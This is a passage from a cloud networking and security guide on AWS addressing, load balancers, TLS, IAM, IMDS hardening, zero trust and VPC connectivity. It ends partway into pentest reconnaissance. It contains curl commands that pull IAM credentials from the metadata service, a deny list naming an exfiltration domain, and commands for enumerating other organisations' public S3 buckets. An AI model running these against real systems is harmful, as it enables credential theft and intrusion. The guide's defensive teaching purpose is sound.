   Auto-assigned if subnet has "auto-assign public IP" enabled
   Changes every time instance STOPS and STARTS
   Released when instance stopped — not yours to keep
   Free — no charge for public IP on running instance
   
   Problem: DNS records break when public IP changes!
   Solution: Use Elastic IP or put ALB in front

3. ELASTIC IP (EIP — static public IP):
   Permanent public IP allocated to your account
   Assign/detach from instances on demand
   When assigned to running instance: free
   When NOT assigned (sitting idle): $0.005/hr (~$3.60/month)
   
   Use cases:
     - NAT Gateway (requires EIP)
     - Static public IP for servers that need whitelisting
     - IP failover: detach from failed instance, attach to replacement
   
   Limit: 5 EIPs per region (soft limit, can increase)
   
   aws ec2 allocate-address --domain vpc
   aws ec2 associate-address --instance-id i-12345678 --allocation-id eipalloc-12345678

4. ANYCAST IP (AWS Global Accelerator):
   Same IP address advertised from 100+ AWS edge locations worldwide
   Traffic enters nearest AWS edge → travels AWS backbone to your region
   
   Benefits:
     - Reduced latency (user connects to closest edge)
     - DDoS protection at edge
     - No DNS propagation delay for failover (IP never changes)
     - TCP/UDP (not just HTTP — unlike CloudFront)
   
   Use: Global applications, gaming, IoT, financial trading

5. IPv6 IN AWS:
   /56 allocated to VPC (256 subnets, each gets a /64)
   Public by default (no private IPv6 in AWS — all globally routable)
   Free — no charges for IPv6 addresses
   
   Egress-Only IGW required to block inbound IPv6 connections
   (like NAT for IPv4 but for IPv6 — IPv6 has no NAT by design)

ENI (Elastic Network Interface) deep dive:
  ENI = virtual NIC attached to EC2
  Each ENI has:
    - One primary private IP (cannot remove)
    - Multiple secondary private IPs
    - One public IP (optional)
    - One EIP (optional)
    - One or more security groups
    - One MAC address (persists across instance restarts)
  
  ENI portability:
    Detach from one instance → attach to another
    MAC address moves with ENI (important for license-locked software!)
    
  Secondary IPs on one ENI (use cases):
    Host multiple SSL/TLS certificates (one IP per cert pre-SNI)
    Multiple virtual servers on one EC2 (each with own IP)
    Kubernetes: pods get secondary IPs from node's ENI (AWS VPC CNI)
```

---

## 29. L4 and L7 Load Balancing in Cloud

### AWS Elastic Load Balancers — Full Comparison

```
                  CLB (Classic)   ALB              NLB              GWLB
                  ─────────────── ──────────────── ──────────────── ────────────────
Layer             4 + 7           7                4                3 (GENEVE tunnel)
Protocol          HTTP/HTTPS/TCP  HTTP/HTTPS/gRPC  TCP/UDP/TLS      IP packets
Routing           Port-based      Content-based    Connection-based Flow-based
Target types      EC2 only        IP, Instance, λ  IP, Instance, ALB IP appliances
WebSocket         ✗               ✓                ✓                N/A
HTTP/2            ✗               ✓                N/A              N/A
Static IP         ✗               ✗ (DNS only)     ✓ (per AZ)       ✓
Preserve src IP   ✗               X-Forwarded-For  ✓ (natively)     ✓
SSL offload       ✓               ✓                ✓ (passthrough)  N/A
Lambda target     ✗               ✓                ✗                ✗
Status            Legacy          Standard choice  High-perf TCP    Security appliances
```

### ALB Deep Dive — Content-Based Routing

```yaml
# ALB Listener rules — evaluated in priority order
Rules:
  Priority 1:
    Condition: HTTP header "X-Internal: true"
    Action: Forward to internal-backend-tg
    
  Priority 2:
    Condition: Path = /api/*
    Action: Forward to api-target-group
    
  Priority 3:
    Condition: Path = /static/*
    Action: Redirect to https://cdn.example.com/{path}
    
  Priority 4:
    Condition: Query string "version=2"
    Action: Forward to v2-target-group (canary)
    
  Priority 5:
    Condition: Source IP = 10.0.0.0/8
    Action: Forward to internal-only-tg
    
  Default:
    Action: Forward to default-target-group

ALB Access Logs (security goldmine):
  Log fields: timestamp, client_ip, elb, target, request_processing_time,
              target_processing_time, response_processing_time,
              elb_status_code, target_status_code, received_bytes,
              sent_bytes, request (method + URL), user_agent, ssl_cipher,
              ssl_protocol, target_group_arn, trace_id, domain_name,
              chosen_cert_arn, matched_rule_priority, request_creation_time,
              actions_executed, redirect_url, error_reason
  
  Security analysis with Athena:
  SELECT client_ip, COUNT(*) as requests, 
         SUM(received_bytes) as total_bytes
  FROM alb_logs
  WHERE elb_status_code = '403'
  GROUP BY client_ip
  ORDER BY requests DESC
  LIMIT 20;
  -- Find IPs getting most 403s → potential scanners/attackers
```

### NLB Deep Dive — Preserving Client IP

```
NLB vs ALB for security monitoring:
  ALB: Replaces src IP with ALB's IP → backend sees ALB IP in logs
       Must use X-Forwarded-For header for real client IP
  NLB: Preserves src IP → backend logs show real client IPs
  
  For security logging and incident response: NLB is better
  For application routing features: ALB is better
  Common pattern: NLB → ALB (NLB gets static IP, ALB does routing)

NLB source IP preservation mechanism:
  NLB operates at L4 — it doesn't rewrite TCP headers
  Traffic comes from client, NLB forwards with same src IP
  Backends must allow NLB's health check IPs + 0.0.0.0/0 (or client CIDRs)
  
  Security group on NLB targets must allow client IP range explicitly
  (Unlike ALB where you allow ALB SG)

NLB with TLS (TLS pass-through vs termination):
  Pass-through: NLB forwards encrypted — backend terminates TLS
    Use: End-to-end encryption required (compliance)
    Limitation: NLB can't inspect content, can't do cert management
  
  Termination: NLB decrypts TLS, forwards plain TCP to backend
    Use: Centralized cert management, backend doesn't handle TLS
    Cert stored in ACM (AWS Certificate Manager) — free certs!
```

### Gateway Load Balancer — For Security Appliances

```
Use case: Insert third-party security appliances (Palo Alto, Fortinet,
          Check Point) transparently into traffic path.

Architecture:
  Client → GWLB Endpoint (in spoke VPC)
         → GWLB (in security VPC)
         → Firewall appliances (in security VPC)
         → GWLB (back)
         → GWLB Endpoint → original destination

The GENEVE tunnel: GWLB uses GENEVE (UDP 6081) to preserve original
packet headers while adding flow stickiness metadata.
Appliances see: original 5-tuple (src/dst IP, port, protocol)

Terraform GWLB setup:
resource "aws_lb" "security_gwlb" {
  name               = "security-gwlb"
  load_balancer_type = "gateway"
  subnets            = var.security_subnet_ids
}

resource "aws_vpc_endpoint_service" "gwlb_service" {
  gateway_load_balancer_arns = [aws_lb.security_gwlb.arn]
  acceptance_required        = false
}
```

---

## 30. Reverse Proxies in Cloud Architecture

### Layman's Terms
In cloud, every major traffic flow goes through a reverse proxy of some kind. The reverse proxy is the **translator and gatekeeper** sitting between the internet and your actual servers — handling TLS termination, routing decisions, header injection, compression, and caching before the request ever reaches your code.

### Cloud Reverse Proxy Stack

```
Request path for a typical cloud-native app:

Internet → CloudFront (CDN/WAF/DDoS) → ALB (L7 LB/routing)
         → Nginx/Envoy (app reverse proxy) → Application
         
Each layer adds value:
  CloudFront:  Edge caching, WAF, DDoS protection, TLS termination
  ALB:         Internal routing (path/host), target group selection, auth
  Nginx:       Rate limiting, auth headers, rewriting, local caching
  Envoy:       mTLS, circuit breaking, retries (if using service mesh)

Nginx as Cloud Reverse Proxy:
server {
    listen 443 ssl http2;
    server_name api.example.com;
    
    # TLS (from ACM cert or Let's Encrypt)
    ssl_certificate /etc/ssl/certs/cert.pem;
    ssl_certificate_key /etc/ssl/private/key.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384;
    
    # Security headers
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header Content-Security-Policy "default-src 'self'" always;
    
    # Rate limiting (define zone above server block):
    # limit_req_zone $binary_remote_addr zone=api_limit:10m rate=100r/m;
    limit_req zone=api_limit burst=20 nodelay;
    
    # Real IP from ALB/CloudFront
    set_real_ip_from 10.0.0.0/8;          # ALB IPs (private)
    real_ip_header X-Forwarded-For;
    
    location /api/ {
        proxy_pass http://app-backend:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        
        # Timeouts
        proxy_connect_timeout 10s;
        proxy_read_timeout 60s;
        proxy_send_timeout 60s;
        
        # Buffer tuning
        proxy_buffering on;
        proxy_buffer_size 16k;
        proxy_buffers 8 16k;
    }
    
    # Health check endpoint (no rate limiting)
    location /health {
        access_log off;
        return 200 "OK";
    }
}

Traefik as Cloud-Native Reverse Proxy (Docker/Kubernetes):
  Auto-discovers services via Docker labels or Kubernetes Ingress
  Automatic TLS from Let's Encrypt
  Real-time config updates without reload
  
  # Docker Compose Traefik label:
  labels:
    - "traefik.enable=true"
    - "traefik.http.routers.myapp.rule=Host(`api.example.com`) && PathPrefix(`/api`)"
    - "traefik.http.routers.myapp.tls.certresolver=letsencrypt"
    - "traefik.http.services.myapp.loadbalancer.server.port=8080"
    - "traefik.http.middlewares.rate-limit.ratelimit.average=100"
    - "traefik.http.routers.myapp.middlewares=rate-limit"
```

---

## 31. TLS/SSL & HTTPS — End-to-End in Cloud

### Layman's Terms
HTTPS is like sending a letter in a **tamper-evident sealed envelope with a verified return address**. TLS does three things: encrypts the contents (confidentiality), verifies who you're talking to (authentication via certificates), and ensures nothing was changed in transit (integrity). In cloud, you have choices about *where* the envelope is opened.

### TLS Termination Points in Cloud

```
OPTION 1: Edge termination (CloudFront/CDN):
  Client ──TLS──► CloudFront ──HTTP──► ALB ──HTTP──► EC2
                  (TLS ends)     (plain)         (plain)
  
  Pro:  Lowest latency for clients (nearest edge handles TLS)
  Con:  Traffic between CloudFront and origin is unencrypted
  Fix:  Require HTTPS between CloudFront and origin:
        CloudFront → Origin Protocol Policy: HTTPS Only

OPTION 2: Load balancer termination:
  Client ──TLS──► ALB ──HTTP──► EC2
  
  Pro:  Centralized cert management (ACM), backend simplicity
  Con:  Internal traffic unencrypted (OK if VPC is trusted)
  Security: Enable VPC Flow Logs, use Security Groups to restrict ALB → EC2

OPTION 3: End-to-end encryption (E2EE):
  Client ──TLS──► NLB ──TLS──► EC2
  
  Pro:  Traffic encrypted entire path (compliance: PCI-DSS, HIPAA)
  Con:  Backend must manage certs, LB can't inspect content
  
OPTION 4: Re-encryption (inspect + re-encrypt):
  Client ──TLS──► ALB (decrypt + WAF inspect) ──TLS──► EC2
  
  Pro:  Best of both — inspection AND backend encryption
  Con:  Higher overhead, two cert management points

Certificate Management in AWS:
  ACM (AWS Certificate Manager):
    Free public certificates (DV — Domain Validated)
    Auto-renewal (no manual intervention)
    Only usable with AWS services (ALB, CloudFront, API GW)
    Cannot export private key
    
  ACM Private CA:
    Issue private certs for internal services
    Used for: mutual TLS (mTLS), internal microservices
    Cost: ~$400/month per CA + $0.75/cert
    
  Let's Encrypt (external):
    Free, used with EC2 directly (not via ACM)
    Use certbot for automation:
    sudo certbot --nginx -d api.example.com
    # Cron for renewal:
    # 0 12 * * * certbot renew --quiet
```

### TLS 1.3 — Why It Matters for Security

```
TLS 1.2 handshake: 2 RTTs before data flows
TLS 1.3 handshake: 1 RTT (or 0-RTT for resumption)

TLS 1.3 removes weak algorithms (all broken ciphers gone):
  Removed: RSA key exchange (no forward secrecy)
           CBC mode ciphers (BEAST, Lucky13 attacks)
           MD5, SHA-1 (collision attacks)
           RC4 (statistical attacks)
           
  Only cipher suites in TLS 1.3:
    TLS_AES_256_GCM_SHA384
    TLS_CHACHA20_POLY1305_SHA256
    TLS_AES_128_GCM_SHA256

Forward Secrecy (PFS) — ALL TLS 1.3 connections:
  Each session gets a fresh ephemeral key (ECDHE)
  Even if server's private key is later compromised:
  → Past sessions CANNOT be decrypted
  
  TLS 1.2 without PFS: capture traffic today, steal key later → decrypt everything
  TLS 1.3: capture traffic today, even with key → cannot decrypt past sessions

Enforcing TLS 1.3 on ALB (AWS Console or via Terraform):
  resource "aws_lb_listener" "https" {
    ssl_policy = "ELBSecurityPolicy-TLS13-1-2-2021-06"
    # This policy: TLS 1.3 preferred, TLS 1.2 as fallback minimum
    # NEVER use "ELBSecurityPolicy-2016-08" (allows TLS 1.0/1.1)
  }

Certificate Transparency (CT) Logs:
  All public TLS certs logged to public CT logs
  Security teams monitor CT logs for:
    - Unauthorized certs issued for your domain
    - Subdomain takeover indicators
    - Shadow IT using your domain
  
  Tools:
    crt.sh: search CT logs → https://crt.sh/?q=%.example.com
    certspotter: alert on new certs for your domains
    
  In practice: monitor CT logs in SIEM, alert on unexpected certs
```

### mTLS — Mutual TLS for Zero Trust

```
Normal TLS: Server authenticates to client (one-way)
mTLS:       Server AND client both present certificates (two-way)

Use cases:
  Service-to-service auth in microservices
  Zero trust network access (ZTNA)
  API authentication (replaces API keys)
  IoT device authentication

mTLS flow:
  Client presents cert → Server verifies against CA
  Server presents cert → Client verifies against CA
  Both authenticated → establish encrypted session

Implementation in Kubernetes (Istio):
  # PeerAuthentication: require mTLS for all intra-namespace traffic
  apiVersion: security.istio.io/v1beta1
  kind: PeerAuthentication
  metadata:
    name: strict-mtls
    namespace: production
  spec:
    mtls:
      mode: STRICT
  
  # Each pod gets a SPIFFE identity:
  # spiffe://cluster.local/ns/production/sa/payment-service
  # Istio issues X.509 cert encoding this identity

API mTLS with Nginx:
  server {
      ssl_client_certificate /etc/ssl/ca.crt;
      ssl_verify_client on;           # Require client cert
      ssl_verify_depth 2;
      
      # Pass client cert CN to backend:
      proxy_set_header X-Client-Cert-CN $ssl_client_s_dn_cn;
  }
```

---

## 32. IAM & Network Security — Where Auth Meets Network

### Layman's Terms
Traditional network security is about "which IP can talk to which IP." Cloud introduced something more powerful: **identity-based network security** — "which *service* or *role* can talk to which resource, and what can it do there?" Your S3 bucket can be locked so that not even a machine on the same network can access it without the right IAM identity. IP alone is not enough.

### IAM + Network: The New Perimeter

```
Traditional security (network-centric):
  IF source_IP in 10.0.0.0/8 THEN allow
  Problem: Lateral movement — attacker pivots to internal IP → trusted

Cloud security (identity + network):
  IF source_IP in 10.0.0.0/8
  AND IAM role = "app-server-role"
  AND MFA = verified
  AND request is from known service
  THEN allow specific actions on specific resources
  
  Attacker gets internal IP but not the IAM role → still blocked

AWS IAM Conditions for Network:
  aws:SourceIp:    Restrict to specific IP/CIDR
  aws:SourceVpc:   Restrict to specific VPC
  aws:SourceVpce:  Restrict to specific VPC Endpoint
  aws:VpcSourceIp: Client IP as seen within VPC

# S3 bucket policy: only allow access from specific VPC
{
  "Effect": "Deny",
  "Principal": "*",
  "Action": "s3:*",
  "Resource": ["arn:aws:s3:::secret-bucket", "arn:aws:s3:::secret-bucket/*"],
  "Condition": {
    "StringNotEquals": {
      "aws:SourceVpc": "vpc-12345678"
    }
  }
}
# This DENIES all S3 access unless coming from VPC vpc-12345678
# Even AWS console access (via internet) is denied!

# Combined: VPC + specific role + no public access
{
  "Effect": "Allow",
  "Principal": {
    "AWS": "arn:aws:iam::123456789:role/data-pipeline-role"
  },
  "Action": ["s3:GetObject", "s3:PutObject"],
  "Resource": "arn:aws:s3:::data-bucket/*",
  "Condition": {
    "StringEquals": {
      "aws:SourceVpce": "vpce-12345678"
    }
  }
}
```

### EC2 Instance Metadata Service (IMDS) — Critical Security Topic

```
IMDS: http://169.254.169.254/latest/
  Every EC2 instance can query this IP for:
    - IAM role credentials (ACCESS KEY, SECRET KEY, SESSION TOKEN)
    - Instance identity (region, account ID, instance ID)
    - User data (often contains secrets!)
    - Network configuration

IMDSv1 (legacy, EXTREMELY DANGEROUS):
  Simple HTTP GET — no authentication needed
  ANY code running on instance can get IAM credentials
  
  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/my-role
  # Returns: AccessKeyId, SecretAccessKey, Token (temporary)
  
  SSRF vulnerability → IMDS access = IAM credentials theft
  Capital One breach (2019): SSRF in WAF → IMDS → S3 data exfiltration
  
IMDSv2 (MANDATORY — enforce this):
  Requires a session token (PUT request first, then GET)
  Session token has a TTL (default 6 hours, can set to 21600s max)
  Blocks SSRF (HTTP libraries used in SSRF don't follow redirects by default)
  
  # Correct IMDSv2 flow:
  TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
    -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
  curl -H "X-aws-ec2-metadata-token: $TOKEN" \
    http://169.254.169.254/latest/meta-data/iam/security-credentials/

Enforce IMDSv2 at launch (Terraform):
  resource "aws_instance" "app" {
    metadata_options {
      http_endpoint               = "enabled"
      http_tokens                 = "required"   # Force IMDSv2
      http_put_response_hop_limit = 1            # Prevent container access to IMDS
      # hop_limit=1: only the instance itself (not containers) can reach IMDS
      # hop_limit=2: containers can reach IMDS (needed for EKS pods)
    }
  }

AWS SCP (Service Control Policy) to enforce IMDSv2 org-wide:
  {
    "Effect": "Deny",
    "Action": "ec2:RunInstances",
    "Resource": "arn:aws:ec2:*:*:instance/*",
    "Condition": {
      "StringNotEquals": {
        "ec2:MetadataHttpTokens": "required"
      }
    }
  }
```

---

## 33. Network Isolation Patterns

### Layman's Terms
Network isolation is the principle of **blast radius reduction** — if one part of your system gets compromised, walls (isolation boundaries) prevent the attacker from reaching everything else. Think of it like watertight compartments in a ship: if one compartment floods, the ship still floats.

### Isolation Patterns

```
PATTERN 1: ACCOUNT-LEVEL ISOLATION (strongest):
  Each environment in a separate AWS account
  Production account, Dev account, Staging account
  No shared VPC, no shared IAM
  
  Blast radius: Attacker compromises dev → cannot touch production
  Tool: AWS Organizations + SCPs (Service Control Policies)
  
  Security benefit: Account boundary > VPC boundary
  IAM role in Account A cannot access Account B resources
  (requires explicit cross-account trust)

PATTERN 2: VPC ISOLATION:
  Each environment/team in separate VPC
  No VPC peering between sensitive VPCs
  Production VPC ←X→ Development VPC
  
  Communication allowed only via:
    - Transit Gateway with explicit routing
    - VPC Endpoints (controlled access to specific services)
    - API Gateway (application-level mediation)

PATTERN 3: SUBNET ISOLATION (within VPC):
  3-tier: public / private / data
  NACLs enforce subnet boundaries
  Security Groups further restrict instance level
  
  Data subnet: NO route to internet (not even NAT GW)
               Only accessible from private subnet
               RDS, ElastiCache, secrets

PATTERN 4: SECURITY GROUP CHAINING:
  ALB-SG → App-SG → DB-SG
  No CIDR ranges → purely identity-based
  Auto-scaling: new instances inherit SG, immediately allowed

PATTERN 5: AWS NETWORK FIREWALL (perimeter inspection):
  Deployed at VPC perimeter (between IGW and subnets)
  Stateful inspection with Suricata-compatible rule engine
  TLS inspection, IDS/IPS, domain filtering
  
  Architecture:
    IGW → Firewall Subnet → Network Firewall → Private Subnets
  
  Terraform:
  resource "aws_networkfirewall_firewall" "main" {
    name                = "main-firewall"
    firewall_policy_arn = aws_networkfirewall_firewall_policy.main.arn
    vpc_id              = aws_vpc.main.id
    subnet_mapping {
      subnet_id = aws_subnet.firewall.id
    }
  }
  
  resource "aws_networkfirewall_rule_group" "block_domains" {
    capacity = 100
    name     = "block-malicious-domains"
    type     = "STATEFUL"
    rule_group {
      rules_source {
        rules_source_list {
          generated_rules_type = "DENYLIST"
          target_types         = ["HTTP_HOST", "TLS_SNI"]
          targets              = ["malware.com", "exfil.attacker.com"]
        }
      }
    }
  }
```

### Hub-and-Spoke vs Flat Network (Architecture Decision)

```
FLAT NETWORK (anti-pattern):
  All services in one VPC, full mesh connectivity
  Any compromise → lateral movement everywhere
  At scale: security groups become unmanageable

HUB-AND-SPOKE (recommended for enterprise):
  
          Dev VPC ──┐
        Stage VPC ──┤
         Prod VPC ──┤──► TRANSIT GATEWAY (hub) ──► Shared Services VPC
       Data VPC   ──┤         (routing control)  ──► Security VPC (FW)
     Partner VPC  ──┘                             ──► On-premises (VPN/DX)
  
  Each spoke VPC = isolated
  Transit Gateway controls what routes are shared
  Shared Services VPC: DNS, Active Directory, monitoring
  Security VPC: Network Firewall inspects all inter-VPC traffic
  
  Security benefit:
    Dev VPC compromise cannot directly reach Prod VPC
    All Dev→Prod traffic must traverse Security VPC (inspected)
```

---

## 34. Zero Trust Networking

### Layman's Terms
Traditional network security assumes: **"if you're inside the building, you're trusted."** Zero Trust flips this: **"trust no one, verify everyone, every time, regardless of where they are."** A hacker who gets onto your internal network finds... another authentication wall. And another. And another. Every resource requires its own verified identity.

### Real-World Event
In 2020, the **SolarWinds supply chain attack** compromised thousands of organizations. Attackers had valid credentials and were inside corporate networks for months. Traditional "inside = trusted" security was completely bypassed. Zero Trust would have detected the anomalous service account behavior regardless of network location.

### Zero Trust Principles

```
PRINCIPLE 1: VERIFY EXPLICITLY
  Authenticate and authorize every request
  Use all available data: identity, device health, location, behavior
  Not just at login — continuous evaluation
  
PRINCIPLE 2: USE LEAST PRIVILEGE ACCESS
  Minimum permissions, minimum network access
  Just-in-time (JIT) access — provision access only when needed
  Time-limited credentials (not permanent API keys)
  
PRINCIPLE 3: ASSUME BREACH
  Design as if attackers are already inside
  Micro-segmentation prevents lateral movement
  Log everything for forensics
  Minimize blast radius of any breach

Zero Trust Architecture Components:

  Identity Provider (IdP):
    Every human and machine has an identity
    Okta, Azure AD, AWS IAM Identity Center
    MFA required for all access
    
  Device Trust:
    Is this device managed? Is it compliant (AV, patched)?
    Devices are not automatically trusted just because they're corporate
    MDM (Intune, Jamf) verifies device health
    
  Policy Engine:
    Evaluates: Who (identity) + What device + What resource + How + When
    Dynamic access decisions — not static firewall rules
    
  Micro-segmentation:
    Network access tied to workload identity (SPIFFE), not IP
    Service mesh (Istio mTLS) implements this in Kubernetes
    
  Continuous Monitoring:
    User behavior analytics (UBA) — detect anomalies
    "Admin account at 3am from Brazil when user is in New York" → alert
```

### BeyondCorp / ZTNA Implementation

```
Google's BeyondCorp (pioneered Zero Trust in 2014):
  Google employees work from coffee shops with same access as office
  No VPN — access determined by device cert + user identity
  All apps behind access proxy that checks policy per request
  
AWS Zero Trust implementation:
  IAM Identity Center (SSO): central identity for all AWS accounts
  AWS Verified Access: Zero Trust access to applications without VPN
  
  Verified Access flow:
    User → Verified Access endpoint (no public app IP exposed)
           → Policy check (identity + device posture)
           → If compliant → proxy to internal app
           → Continuous re-evaluation per request
  
  resource "aws_verifiedaccess_instance" "main" {
    description = "zero-trust-access"
  }
  
  resource "aws_verifiedaccess_trust_provider" "okta" {
    trust_provider_type          = "user"
    user_trust_provider_type     = "oidc"
    oidc_options {
      issuer                = "https://company.okta.com"
      client_id             = var.okta_client_id
      client_secret         = var.okta_client_secret
      authorization_endpoint = "https://company.okta.com/oauth2/v1/authorize"
      token_endpoint         = "https://company.okta.com/oauth2/v1/token"
      user_info_endpoint     = "https://company.okta.com/oauth2/v1/userinfo"
      scope                  = "openid email profile"
    }
  }

Practical Zero Trust for DevOps teams:
  1. Replace VPN with ZTNA solution (Cloudflare Access, Zscaler, Tailscale)
  2. Never use long-lived API keys → use IAM roles, OIDC federation
  3. Enable MFA for all production access (no exceptions)
  4. Implement break-glass procedures for emergency access (with full audit)
  5. Use AWS SSM Session Manager instead of SSH (no port 22 needed):
     aws ssm start-session --target i-12345678
     # No SG inbound rule needed, no SSH key, full audit trail
```

---

## 35. VPC Peering, Transit Gateway, PrivateLink

### Layman's Terms
You have multiple VPCs (networks). How do they talk to each other?
- **VPC Peering**: Direct tunnel between two VPCs — like digging a private tunnel between two buildings.
- **Transit Gateway**: A central hub router — all buildings connect to the central hub, hub routes between them. Much more scalable.
- **PrivateLink**: A one-way door from your VPC into someone else's service — without actually joining their network.

### VPC Peering

```
Properties:
  - Direct 1:1 connection between two VPCs
  - No bandwidth limit, no single point of failure
  - Cross-account AND cross-region supported
  - Cost: Data transfer charges (cross-AZ/cross-region)
  - NO TRANSITIVE ROUTING (critical limitation!)

Transitive routing problem:
  VPC-A ←─peering─→ VPC-B ←─peering─→ VPC-C
  VPC-A CANNOT reach VPC-C via VPC-B
  Each VPC pair needs its own peering connection
  
  At 5 VPCs: 5×(5-1)/2 = 10 peering connections
  At 10 VPCs: 45 peering connections
  At 50 VPCs: 1,225 peering connections ← unmanageable
  
  Use Transit Gateway when you have >3 VPCs

VPC Peering setup:
  # Requester (VPC-A account):
  aws ec2 create-vpc-peering-connection \
    --vpc-id vpc-aaaa1111 \
    --peer-vpc-id vpc-bbbb2222 \
    --peer-owner-id 123456789012   # Can be same or different account
    --peer-region us-west-2        # Cross-region peering
  
  # Accepter (VPC-B account):
  aws ec2 accept-vpc-peering-connection \
    --vpc-peering-connection-id pcx-12345678
  
  # Add routes in BOTH VPCs:
  # VPC-A route table:
  #   10.1.0.0/16 → pcx-12345678
  # VPC-B route table:
  #   10.0.0.0/16 → pcx-12345678
  
  # Update Security Groups to allow traffic from peer CIDR:
  aws ec2 authorize-security-group-ingress \
    --group-id sg-app123 \
    --protocol tcp --port 8080 \
    --cidr 10.1.0.0/16   # Peer VPC CIDR
  
  # OR reference peer VPC SG (cross-account requires same region):
  aws ec2 authorize-security-group-ingress \
    --group-id sg-app123 \
    --source-group sg-peer456 \
    --source-group-owner-id 123456789012
```

### Transit Gateway (TGW)

```
Transit Gateway = centralized hub router for VPCs and VPNs.

Supports:
  - Up to 5,000 VPC attachments
  - VPN connections (Site-to-Site)
  - Direct Connect Gateway attachment
  - Peering with other TGWs (cross-region)
  - Multicast routing

TGW routing tables:
  Each attachment associates with one route table
  Multiple route tables = traffic segmentation:
  
  ROUTE TABLE: "production"
    Associated: prod-vpc, staging-vpc
    Routes: 10.0.0.0/16 (prod) → vpc-prod attachment
             10.1.0.0/16 (staging) → vpc-staging attachment
             0.0.0.0/0 → NOT present (no internet breakout here)
  
  ROUTE TABLE: "security"
    Associated: security-vpc
    Routes: 0.0.0.0/0 → security-vpc attachment (all traffic inspected)
  
  BLACKHOLE route (drop traffic):
    10.2.0.0/16 → blackhole
    Blocks dev VPC from reaching production via TGW

TGW vs VPC Peering:
  Use VPC Peering:  2-3 VPCs, same team, simple topology
  Use TGW:          4+ VPCs, multiple accounts, hybrid connectivity

TGW cost: $0.05/hr per attachment + $0.02/GB data processed
  10 VPCs = $0.50/hr just for attachments
  Factor into architecture decisions!

Terraform TGW:
resource "aws_ec2_transit_gateway" "main" {
  description                     = "Central hub"
  default_route_table_association = "disable"
  default_route_table_propagation = "disable"
  auto_accept_shared_attachments  = "enable"
  tags = { Name = "main-tgw" }
}

resource "aws_ec2_transit_gateway_vpc_attachment" "prod" {
  subnet_ids         = var.prod_tgw_subnet_ids
  transit_gateway_id = aws_ec2_transit_gateway.main.id
  vpc_id             = aws_vpc.prod.id
}

resource "aws_ec2_transit_gateway_route_table" "prod" {
  transit_gateway_id = aws_ec2_transit_gateway.main.id
}

resource "aws_ec2_transit_gateway_route" "to_staging" {
  destination_cidr_block         = "10.1.0.0/16"
  transit_gateway_attachment_id  = aws_ec2_transit_gateway_vpc_attachment.staging.id
  transit_gateway_route_table_id = aws_ec2_transit_gateway_route_table.prod.id
}
```

### AWS PrivateLink

```
PrivateLink: Expose a service from one VPC to other VPCs
WITHOUT network-level access (no peering, no routing access).

Traditional service sharing problem:
  VPC-A has a payment API that VPC-B needs to access
  VPC peering: VPC-B gets network access to ALL of VPC-A (too broad)
  PrivateLink: VPC-B gets access ONLY to the payment API endpoint

How PrivateLink works:
  Provider side (VPC-A):
    1. Put service behind NLB
    2. Create VPC Endpoint Service → NLB
    3. Whitelist which AWS accounts can connect
  
  Consumer side (VPC-B):
    1. Create Interface Endpoint → Endpoint Service
    2. ENI created in VPC-B subnet with private IP
    3. Traffic to ENI → PrivateLink → NLB → Service
    
  Traffic NEVER leaves AWS network.
  VPC-B has no routing access to VPC-A.
  VPC-A doesn't even see VPC-B's IP (it's NLB-originated).

PrivateLink vs Peering:
  PrivateLink: Service access (application level, one service)
  Peering:     Network access (all traffic between VPCs)
  
  Use PrivateLink for: SaaS products, shared internal services,
                       partner integrations, ISV offerings
  
  AWS services use PrivateLink for VPC Endpoints:
    com.amazonaws.us-east-1.ssm → connects to SSM via PrivateLink
    No traffic leaves VPC to reach SSM API — completely private

Terraform PrivateLink:
# Provider: create endpoint service
resource "aws_vpc_endpoint_service" "payment_api" {
  acceptance_required        = true
  network_load_balancer_arns = [aws_lb.payment_nlb.arn]
  allowed_principals         = ["arn:aws:iam::CONSUMER_ACCOUNT_ID:root"]
}

# Consumer: create interface endpoint
resource "aws_vpc_endpoint" "payment" {
  vpc_id              = aws_vpc.consumer.id
  service_name        = aws_vpc_endpoint_service.payment_api.service_name
  vpc_endpoint_type   = "Interface"
  subnet_ids          = var.private_subnet_ids
  security_group_ids  = [aws_security_group.endpoint.id]
  private_dns_enabled = true  # payment-api.example.com resolves to endpoint IP
}
```

---

## 36. Cloud Attack Surface & Pentest Scenarios

### Layman's Terms
Cloud environments have a fundamentally different attack surface from on-premises. The perimeter is gone. Configuration mistakes (not patching a firewall) are replaced by **misconfiguration** (wrong IAM policy, public S3 bucket, exposed metadata service). Most major cloud breaches are not sophisticated zero-days — they're configuration errors that an attacker found before you did.

### Cloud Attack Kill Chain

```
Traditional Kill Chain:       Cloud Kill Chain:
  Reconnaissance                Reconnaissance
  Weaponization                 Initial Access (3 paths):
  Delivery                        A) Exposed service (port scan → RCE)
  Exploitation                    B) Phishing → credential theft
  Installation                    C) Supply chain / dependency
  C2                            Privilege Escalation:
  Actions on Objective            - SSRF → IMDS → IAM credentials
                                  - IAM privilege escalation
                                  - Role chaining
                                Lateral Movement:
                                  - Use stolen creds for other services
                                  - EC2 → assume role → S3 → RDS
                                Actions on Objective:
                                  - Exfil data from S3
                                  - Crypto mining (EC2 spin-up)
                                  - Ransomware (encrypt EBS/S3)
                                  - Account takeover (create backdoor IAM user)
```

### Recon Phase — Cloud-Specific Techniques

```bash
# 1. S3 bucket enumeration (public buckets are a goldmine)
aws s3 ls s3://company-name-backup --no-sign-request
aws s3 ls s3://company-name-dev --no-sign-request
aws s3 ls s3://company-name-logs --no-sign-request

# Tools for S3 bucket discovery:
pip install s3scanner
s3scanner -bucket company-name

# Cloud_enum (enumerate across AWS, GCP, Azure):
pip install cloud_enum
cloud_enum -k targetcompany

# 2. AWS account ID enumeration (from public S3 bucket policy):
aws s3api get-bucket-policy --bucket target-bucket \
  | python3 -m json.tool | grep "aws:PrincipalAccount"
# Principal account ID = target's AWS account ID

# 3. IAM user/role enumeration (without credentials):
